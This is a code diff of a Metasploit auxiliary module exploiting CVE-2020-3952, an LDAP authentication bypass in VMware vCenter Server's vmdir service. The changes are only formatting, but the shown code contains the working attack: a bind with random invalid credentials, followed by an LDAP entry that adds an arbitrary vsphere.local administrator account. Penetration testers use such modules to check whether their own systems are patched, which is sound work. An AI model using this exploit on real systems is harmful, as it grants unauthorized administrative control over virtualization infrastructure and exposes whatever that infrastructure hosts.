@@ -9,36 +9,39 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::CheckModule
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'VMware vCenter Server vmdir Authentication Bypass',
-      'Description'    => %q{
-        This module bypasses LDAP authentication in VMware vCenter Server's
-        vmdir service to add an arbitrary administrator user. Version 6.7 prior
-        to the 6.7U3f update is vulnerable.
-      },
-      'Author'         => [
-        # Discovered by unknown researcher(s)
-        'JJ Lehmann', # Analysis and PoC
-        'Ofri Ziv',   # Analysis and PoC
-        'wvu'         # Module
-      ],
-      'References'     => [
-        ['CVE', '2020-3952'],
-        ['URL', 'https://www.guardicore.com/2020/04/pwning-vmware-vcenter-cve-2020-3952/'],
-        ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
-      ],
-      'DisclosureDate' => '2020-04-09', # Vendor advisory
-      'License'        => MSF_LICENSE,
-      'Actions'        => [['Add', 'Description' => 'Add an admin user']],
-      'DefaultAction'  => 'Add',
-      'DefaultOptions' => {
-        'CheckModule'  => 'auxiliary/gather/vmware_vcenter_vmdir_ldap'
-      },
-      'Notes'          => {
-        'Stability'    => [SERVICE_RESOURCE_LOSS],
-        'SideEffects'  => [IOC_IN_LOGS, CONFIG_CHANGES]
-      }
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'VMware vCenter Server vmdir Authentication Bypass',
+        'Description' => %q{
+          This module bypasses LDAP authentication in VMware vCenter Server's
+          vmdir service to add an arbitrary administrator user. Version 6.7 prior
+          to the 6.7U3f update is vulnerable.
+        },
+        'Author' => [
+          # Discovered by unknown researcher(s)
+          'JJ Lehmann', # Analysis and PoC
+          'Ofri Ziv', # Analysis and PoC
+          'wvu' # Module
+        ],
+        'References' => [
+          ['CVE', '2020-3952'],
+          ['URL', 'https://www.guardicore.com/2020/04/pwning-vmware-vcenter-cve-2020-3952/'],
+          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
+        ],
+        'DisclosureDate' => '2020-04-09', # Vendor advisory
+        'License' => MSF_LICENSE,
+        'Actions' => [['Add', 'Description' => 'Add an admin user']],
+        'DefaultAction' => 'Add',
+        'DefaultOptions' => {
+          'CheckModule' => 'auxiliary/gather/vmware_vcenter_vmdir_ldap'
+        },
+        'Notes' => {
+          'Stability' => [SERVICE_RESOURCE_LOSS],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
+        }
+      )
+    )
 
     register_options([
       OptString.new('USERNAME', [false, 'Username of admin user to add']),
@@ -85,8 +88,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     opts = {
-      host:            rhost,
-      port:            rport,
+      host: rhost,
+      port: rport,
       connect_timeout: datastore['ConnectTimeout']
     }
 
@@ -107,7 +110,7 @@ class MetasploitModule < Msf::Auxiliary
   # This will always return false, since the creds are invalid
   def auth_bypass(ldap)
     ldap.bind(
-      method:   :simple,
+      method: :simple,
       username: Rex::Text.rand_text_alphanumeric(8..42),
       password: Rex::Text.rand_text_alphanumeric(8..42)
     )
@@ -115,14 +118,14 @@ class MetasploitModule < Msf::Auxiliary
 
   def add_admin(ldap)
     user_info = {
-      'objectClass'       => %w[top person organizationalPerson user],
-      'cn'                => username,
-      'sn'                => 'vsphere.local',
-      'givenName'         => username,
-      'sAMAccountName'    => username,
+      'objectClass' => %w[top person organizationalPerson user],
+      'cn' => username,
+      'sn' => 'vsphere.local',
+      'givenName' => username,
+      'sAMAccountName' => username,
       'userPrincipalName' => "#{username}@VSPHERE.LOCAL",
-      'uid'               => username,
-      'userPassword'      => password
+      'uid' => username,
+      'userPassword' => password
     }
 
     # Add our new user
